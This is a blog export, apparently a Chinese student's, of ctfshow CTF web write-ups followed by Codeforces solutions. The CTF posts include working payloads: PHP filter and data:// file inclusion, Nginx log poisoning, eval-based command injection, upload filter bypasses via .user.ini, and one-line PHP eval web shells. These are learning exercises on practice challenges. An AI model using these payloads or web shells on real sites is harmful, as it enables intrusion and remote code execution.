*CTF&#123;St.Diana_pls_take_me_with_you!&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://zzuzyj.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"http://zzuzyj.github.io/tags/RSA/"}]},{"title":"ctfshow爆破入门","slug":"ctfshow爆破入门","date":"2022-05-03T09:23:29.896Z","updated":"2022-04-27T12:23:34.000Z","comments":true,"path":"2022/05/03/ctfshow爆破入门/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow%E7%88%86%E7%A0%B4%E5%85%A5%E9%97%A8/","excerpt":"","text":"web21 web22 web23 web24 web25 web26 web27 web28 web21拿到题目给的字典，抓一下包 看的群主大大的wp，太菜了，这里一定不要打对号 可以成功爆破拿到flag web22子域名爆破 在线网站 phpinfo.me/domain 这flag藏的我直呼好家伙 web2312345678910111213141516171819202122232425262728&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-03 11:43:51# @Last Modified by: h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 直接把条件语句拉到本地跑一遍，得到两个数字符合条件 传入拿到flag web24又是一个假的爆破题 1234567891011121314error_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(372619038); if(intval($r)===intval(mt_rand()))&#123; echo $flag; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 随机种子直接告诉我们了，，，生成的随机数是不变的，直接在本地跑一次拿到随机数，传入参数拿到flag web2512345678910111213141516error_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;); 逻辑分析 传入?r=0可以得到 随机数的负值，然后可以用工具脚本跑出随机种子 用插件识别php版本，发现用0xcfcf14188较为合适，本地测试发现也对得上，继续往下走 12echo mt_rand()+mt_rand(); 本地输出跑一下写入cookie 。。。。发现flag出不来 更改了几次随机种子，最后还是拿到了flag web26类似21 直接爆破就可以了 成功拿到flag web27找到一个附件 又发现一个学号查询 生成字典直接爆破中间八位数字，我用的是c++ 12345678910111213#include&lt;iostream&gt;using namespace std;int main()&#123; freopen(&quot;mima.txt&quot;,&quot;w&quot;,stdout); for(int i=1990;i&lt;=2010;i++)&#123; for(int j=1;j&lt;=12;j++)&#123; for(int k=1;k&lt;=31;k++)&#123; printf(&quot;%d%02d%02d\\n&quot;,i,j,k); &#125; &#125; &#125;&#125; 爆破成功，解码拿到学号，登录拿到flag web28 是否发现目录有些问题 burp爆破一波 得到/72/20时候返回200 访问得到flag","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"爆破","slug":"爆破","permalink":"http://zzuzyj.github.io/tags/%E7%88%86%E7%A0%B4/"}]},{"title":"ctfshow文件包含","slug":"ctfshow文件包含","date":"2022-05-03T09:23:29.890Z","updated":"2022-04-28T06:51:16.000Z","comments":true,"path":"2022/05/03/ctfshow文件包含/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"web781234567if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 很容易想到文件读取 盲猜测一波flag.php 1?file=php://filter/convert.base64-encode/resource=flag.php 有回显，解码得到flag 123456789101112131415&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 10:55:11# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 10:55:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;206aa53e-8465-4269-a340-1a0a08eae9a4&#125;&quot;; web791234567if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; php被过滤了，但是还有data得哇,不慌 1?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= web80123456789if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; data协议也被ban了，但是还可以用日志包含文件 通过Wappalyzer得知中间件是Nginx ，访问其默认日志文件 1?file=/var/log/nigix/access.log 发现User-Agent可以写shell 拆入一句话木马 1&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt; 连接拿到flag web8112345678910if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 多过滤了冒号，但不影响，同上","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"文件包含","slug":"文件包含","permalink":"http://zzuzyj.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"ctfshow文件上传","slug":"ctfshow文件上传","date":"2022-05-03T09:23:29.885Z","updated":"2022-04-30T08:29:06.000Z","comments":true,"path":"2022/05/03/ctfshow文件上传/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"web151提示说前端验证不可靠，说明这一题后端没有做验证处理，直接改前端绕过即可。 用蚁剑连接上找到flag web152先如上题一样，发现 上传失败，说明后端进行了简单的验证 抓包看一下 直接改后缀名 不行，unicode解码发现返回文件类型不合，更改文件类型发现能访问但是没有解析执行shell ，将文件名改为php试一下 上传成功，蚁剑连接拿到flag web153用上一题的走了一遍，发现不行了，八成是后端对文件内容或者是文件后缀进行了检验，直接上传一张图片 ，抓包更改参数 先尝试是否过滤后缀名 返回错误，过滤了 此路不通。上传.user.ini文件试试 上传成功 继续上传1.txt 蚁剑连接，拿到flag web154直接传一手.user.ini成功 但是上传txt文件发现抱错文件内容不合 我们更改二进制文件头 返回仍旧错误 把一句话木马删除，成功了，说明检测到了一句话木马不让过 更改木马语句为 1&lt;?php ?&gt; 还是不行，把php大写，过了，说明检测了php的存在，将语句改为短标签写法 1&lt;?=eval($_POST[&#x27;attack&#x27;]);?&gt; 上传成功了 蚁剑连接拿到flag 文件上传总结1 前端绕过 2 抓包绕过文件类型 3 .user.ini 实现php解析 4 语句过滤php可以改为短标签写法","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"文件上传","slug":"文件上传","permalink":"http://zzuzyj.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"ctfshow命令执行1","slug":"ctfshow命令执行1","date":"2022-05-03T09:23:29.880Z","updated":"2022-04-27T11:57:28.000Z","comments":true,"path":"2022/05/03/ctfshow命令执行1/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/","excerpt":"","text":"web29 web30 web31 web32 web33 web34 web35 web36 web29123456789101112*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析：过滤了flag，但是有一个eval函数，可以将传参当成代码执行，可以利用一下 测试发现没有过滤system函数 构造?c=system(‘cp f?ag.php 111.txt’); 访问111.txt得到flag web30123456789101112*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 叫上题相比多过滤了php和sysytem, 但是使用反引号其实是和system相同的作用， 过滤了php可以用占位符?代替 构造?c=cp fla?.??? 111.txt; 访问拿到flag web3112345678910error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 又多过滤了点，空格等等 eval嵌套执行命令 构造 1?c=eval($_GET[111]);&amp;111=phpinfo(); 命令成功执行 继续 1?c=eval($_GET[111]);&amp;111=`cp%20flag.php%20111.txt`; 成功拿到 web321234567891011error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 又ban了几个符号 分号被ban掉，我们可以尝试用?&gt;代替，因为php结尾最后一句不用写分号,反引号也ban了 可以通过文件包含将flag.php包含以进行读取 构造 1234?c=include%0a$_GET[111]?&gt;&amp;111=php://filter/convert.base64-encode/resource=flag.phpfilter：通过指定的通道来读取指定的文件这里使用base64读取不用base64读不到源文件 得到源码的base64形式，解码得到flag 123456789101112131415&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:49:19# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;72ed316e-44a9-4e6a-9e15-cfaa9f15ddd6&#125;&quot;; web3312345678910error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 过滤了双引号，好像上一题的方法可以搬过来。 又学了一招，文件包含还可以用require 12345678910error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 构造 12?c=require%0a$_GET[lll]?&gt;&amp;lll=php://filter/convert.base64-encode/resource=flag.php#解开base64得flag 123456789101112131415&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:49:19# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;b7e7c748-9729-425b-b08d-fc9d9100a6ac&#125;&quot;; web34过滤了冒号，，，不知道还有啥方法 老套路掏出来 1?c=require%0a$_GET[lll]?&gt;&amp;lll=php://filter/convert.base64-encode/resource=flag.php 解码拿到flag 1234567891011121314&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:49:19# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;ba628d0f-c1d5-46aa-9443-5787a12426be&#125;&quot;; web35payload还能用，，秒了 1?c=require%0a$_GET[lll]?&gt;&amp;lll=php://filter/convert.base64-encode/resource=flag.php 略 web36咳咳，秒了 1?c=require%0a$_GET[lll]?&gt;&amp;lll=php://filter/convert.base64-encode/resource=flag.php 略","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"命令执行","slug":"命令执行","permalink":"http://zzuzyj.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"","slug":"ctfshow反序列化","date":"2022-05-03T09:23:29.875Z","updated":"2022-04-28T06:54:56.000Z","comments":true,"path":"2022/05/03/ctfshow反序列化/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"12345678title: ctfshow反序列化categories: webmathjax: truehidden: falsetags: - web- 反序列化- ctfshow","categories":[],"tags":[]},{"title":"ctfshow——sql注入","slug":"ctfshow_sql注入","date":"2022-05-03T09:23:29.845Z","updated":"2022-04-28T06:54:06.000Z","comments":true,"path":"2022/05/03/ctfshow_sql注入/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow_sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"sql注入","slug":"sql注入","permalink":"http://zzuzyj.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"ctfshow_php特性","slug":"ctfshow_php特性","date":"2022-05-03T09:23:29.840Z","updated":"2022-04-28T08:39:50.000Z","comments":true,"path":"2022/05/03/ctfshow_php特性/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/","excerpt":"","text":"web8912345678910111213include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 直接数组绕过了preg_match函数 1?num[]=1 web9012345678910111213include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 要求num等于数字4476不能等于字符4476，可以进制转换绕过 构造 1?num=0x117c web911234567891011121314show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125; 要求传入cmd参数满足if条件输出flag，比较发现两个正则有个m得差异 可以构造 1?cmd=%0aphp web92123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125; 弱类型比较，直接传入16进制数就好了 web9312345678910111213141516include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; ban掉了字母，相当于ban掉了16进制，但是还可以用八进制 1?num=010574 web94123456789101112131415include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; 要求出现字符0且不在首位，但是全等类型ban掉了八进制，但是我们可以在八进制前加一个空格 由于invtal只识别整数部分，我们可以尝试 1?num= 010574 另外还可以 12?num=4476.0?num=+4476.0 web951234567891011121314151617include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125; 叫上题变化了一些，4476.0 不再可用，因为绕不过 if($num==4476){ 但是空格+010574仍然可以绕过这句话 1?num= 010574 web96123456789101112highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 想要读取flag，单独使用flag.php 这时候我们可以加上路径进行读取 123?u=/var/www/html/flag.php 绝对路径?u=./flag.php 相对路径?u=php://filter/resource=flag.php php伪协议 都可以读取到flag web9712345678910include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; md5()函数无法处理数组，如果传入的值为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的 1a[]=1&amp;b[]=2 web9812345include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__); $_GET?$_GET=&amp;$_POST:&#39;flag&#39;将POST值覆盖GET值 直接GET型提交flag会被flag的COOKIE、SERVER覆盖 但最后需要GET型提交HTTP_FLAG=flag 所以我们构造： GET：?helloPOST：HTTP_FLAG=flag` 其实就是几个三目运算吧 web9912345678910highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; array_push()将随机数(必定有1)添加到数组$allow中 in_array()函数搜索数组中是否存在指定的值 利用in_array()的弱比较类型，构造?n=1.php 同时POST传入一句话木马 1content=&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt; web100123456789101112131415highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125;&#125; is_numeric 检测是否为数字，因为用and连接，所以只需要有一个为数字就可，同时v2,v3过滤了分号 构造 1?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"},{"name":"php特性","slug":"php特性","permalink":"http://zzuzyj.github.io/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow——java","slug":"ctfshow_java","date":"2022-05-03T09:23:29.819Z","updated":"2022-04-28T06:55:44.000Z","comments":true,"path":"2022/05/03/ctfshow_java/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/ctfshow_java/","excerpt":"","text":"","categories":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zzuzyj.github.io/tags/web/"},{"name":"java安全","slug":"java安全","permalink":"http://zzuzyj.github.io/tags/java%E5%AE%89%E5%85%A8/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://zzuzyj.github.io/tags/ctfshow/"}]},{"title":"CF1669(Div.4)","slug":"CF1669(Div_4)","date":"2022-05-03T09:23:29.814Z","updated":"2022-04-24T11:01:48.000Z","comments":true,"path":"2022/05/03/CF1669(Div_4)/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/CF1669(Div_4)/","excerpt":"","text":"Codeforces Round #784 (Div. 4) A Division? B Triple C Odd/Even Increments D. Colorful Stamp E. 2-Letter Strings F. Eating Candies G. Fall Down H. Maximal AND Codeforces Round #784 (Div. 4)新人菜鸡，没有ak，说实话题目英语真没看懂，来补个题 A Division?简单if else判断语句 1234567891011121314151617#include&lt;iostream&gt;using namespace std;typedef long long ll;const int mod=1e9+7;const int maxn=1e6+10;int main()&#123; int tt;cin&gt;&gt;tt; while(tt--)&#123; cout&lt;&lt;&quot;Division &quot;&lt;&lt;endl; int n;cin&gt;&gt;n; if(n&gt;=1900)cout&lt;&lt;1&lt;&lt;endl; else if(n&gt;=1600)cout&lt;&lt;2&lt;&lt;endl; else if(n&gt;=1400)cout&lt;&lt;3&lt;&lt;endl; else cout&lt;&lt;4&lt;&lt;endl; &#125; return 0;&#125; B Triple数据范围不大，直接可以用数组存数据，最后判定是否存在ans[i]&gt;=3,if ok ,输出 i，没有输出 -1 12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;typedef long long ll;const int maxn=2*1e5+10;int ans[maxn];int main()&#123; // freopen(&quot;out&quot;,&quot;w&quot;,stdout); int tt;cin&gt;&gt;tt; while(tt--)&#123; memset(ans,0,sizeof(ans)); int n;cin&gt;&gt;n; int flag=-1; for(int i=1;i&lt;=n;i++)&#123; int t;cin&gt;&gt;t; ans[t]++; if(ans[t]&gt;=3)flag=t; &#125; cout&lt;&lt;flag&lt;&lt;endl; &#125; return 0;&#125; C Odd/Even Incrementsc题是个奇偶判定，要求奇数位必须都是奇数或偶数，偶数位必须也都是奇数或偶数 1234567891011121314151617181920212223242526#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;const int maxn=1e3+10;int a[maxn];int main()&#123; //freopen(&quot;in&quot;,&quot;r&quot;,stdin); //freopen(&quot;out&quot;,&quot;w&quot;,stdout); int tt;cin&gt;&gt;tt; while(tt--)&#123; memset(a,0,sizeof(a)); int n;cin&gt;&gt;n; for(int i=1;i&lt;=n;i++)cin&gt;&gt;a[i]; int flag1=a[1]%2,flag2=a[2]%2,flag=1; for(int i=3;i&lt;=n;i++)&#123; if(i%2==1)&#123; if(a[i]%2!=flag1)&#123; flag=0;break;&#125; &#125; else if(a[i]%2!=flag2)&#123;flag=0;break;&#125; &#125; if(flag)cout&lt;&lt;&quot;YES&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;NO&quot;&lt;&lt;endl; &#125; return 0;&#125; D. Colorful Stamp结论判定，如果一段区间被染色，必存在r,b两种颜色，o(n)扫一遍即可 12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std;int n;char a[200005];int main()&#123; //freopen(&quot;in&quot;,&quot;r&quot;,stdin); // freopen(&quot;out&quot;,&quot;w&quot;,stdout); int tt;cin&gt;&gt;tt; while(tt--)&#123; cin&gt;&gt;n; scanf(&quot;%s&quot;,a+1); bool flag=1; for(int i=1;i&lt;=n;i++)&#123; if(a[i]==&#x27;W&#x27;)continue; int j=i; while(j&lt;n&amp;&amp;a[j+1]!=&#x27;W&#x27;)j++; bool flag1=0,flag2=0; for(int k=i;k&lt;=j;k++)&#123; if(a[k]==&#x27;R&#x27;)flag1=1; if(a[k]==&#x27;B&#x27;)flag2=1; &#125; if(!(flag1&amp;&amp;flag2))flag=0; i=j; &#125; if(flag)puts(&quot;YES&quot;); else puts(&quot;NO&quot;); &#125;&#125; E. 2-Letter Strings我们可以统计只有出现重复字符的字符数，相同的话减去，用mp1存第一个位置，mp2存第二个位置，mp存字符串，出现过的话-mp[s]*2 123456789101112131415161718192021#include&lt;iostream&gt;#include&lt;map&gt;using namespace std;#define int long longmap&lt;char,int&gt;mp1,mp2;map&lt;string,int&gt;mp;signed main()&#123; //freopen(&quot;in&quot;,&quot;r&quot;,stdin); // freopen(&quot;out&quot;,&quot;w&quot;,stdout); int tt;cin&gt;&gt;tt; while(tt--)&#123; mp.clear();mp1.clear();mp2.clear(); int n;cin&gt;&gt;n;int ans=0; for(int i=1;i&lt;=n;i++)&#123; string s;cin&gt;&gt;s; ans+=((mp1[s[0]]++)+(mp2[s[1]]++)-(mp[s]++)*2); &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125;&#125; F. Eating Candies做一个前缀和，左右指针往中间走，判断sum[l]与sum[n]-sum[r-1] 的关系，如果大于，l++,如果等于 用ans记录答案=l+n+1-r,r—;其他r— 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;typedef long long ll;const int mod=1e9+7;const int maxn=2*1e5+10;int sum[maxn];int main()&#123; //freopen(&quot;in&quot;,&quot;r&quot;,stdin); // freopen(&quot;out&quot;,&quot;w&quot;,stdout); int tt;cin&gt;&gt;tt; while(tt--)&#123; int n,a;cin&gt;&gt;n; for(int i=1;i&lt;=n;i++)&#123;cin&gt;&gt;a;sum[i]=sum[i-1]+a[i];&#125; int l=1,r=n,ans=0; while(l&lt;r)&#123; if(sum[l]&lt;(sum[n]-sum[r-1]))l++; else if(sum[l]==(sum[n]-sum[r-1]))ans=l+n-r+1,r--; else r--; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0;&#125; G. Fall Down，初始化在每一列的下面加一块o，记录在o出现前的*的数量，最后直接给数组赋值即可，o上面一定全是石头，石头上到 o前全是. 123456789101112131415161718192021222324252627282930313233#include&lt;iostream&gt;using namespace std;const int maxn=55;char a[maxn][maxn];int main()&#123; int tt;cin&gt;&gt;tt; while(tt--)&#123; int n,m;cin&gt;&gt;n&gt;&gt;m; for(int i=1;i&lt;=n;i++) for(int j=1;j&lt;=m;j++) cin&gt;&gt;a[i][j]; for(int i=1;i&lt;=m;i++)a[n+1][i]=&#x27;o&#x27;; for(int i=1;i&lt;=m;i++)&#123; int cnt=0,st=1; for(int j=1;j&lt;=n+1;j++)&#123; if(a[j][i]==&#x27;*&#x27;)cnt++; else if(a[j][i]==&#x27;.&#x27;)continue; else if(a[j][i]==&#x27;o&#x27;)&#123; for(int k=st;k&lt;=j-1;k++)&#123; a[k][i]=&#x27;.&#x27;; &#125; for(int k=j-cnt;k&lt;j;k++)&#123; a[k][i]=&#x27;*&#x27;; &#125; st=j+1,cnt=0; &#125; &#125; &#125; for(int i=1;i&lt;=n;i++)&#123; for(int j=1;j&lt;=m;j++)cout&lt;&lt;a[i][j];cout&lt;&lt;&#x27;\\n&#x27;;&#125; &#125; return 0;&#125; H. Maximal AND思考or和and的定义，发现题目是让我们计算高位到地位的1的数，当然这只是前提，计算0-30每一位1 个数的和，如果为n，则此位的and值为 1&gt;&gt;j ,j为位数，只要把30-0扫一遍，判断k是否够用，ans+=1&gt;&gt;j即可 1234567891011121314151617181920212223242526#include&lt;iostream&gt;using namespace std;int main()&#123; //freopen(&quot;in&quot;,&quot;r&quot;,stdin); // 